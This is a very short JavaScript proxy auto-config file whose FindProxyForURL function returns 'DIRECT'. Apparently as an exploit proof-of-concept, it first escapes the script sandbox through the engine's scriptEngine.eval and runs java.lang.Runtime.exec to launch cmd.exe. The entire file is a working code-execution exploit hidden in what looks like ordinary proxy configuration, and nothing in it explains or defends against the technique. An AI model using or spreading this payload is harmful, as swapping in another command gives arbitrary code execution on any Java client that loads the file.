function FindProxyForURL(url, host) {

    this.engine.factory.scriptEngine.eval('java.lang.Runtime.getRuntime().exec("cmd.exe")')

    return 'DIRECT';
}
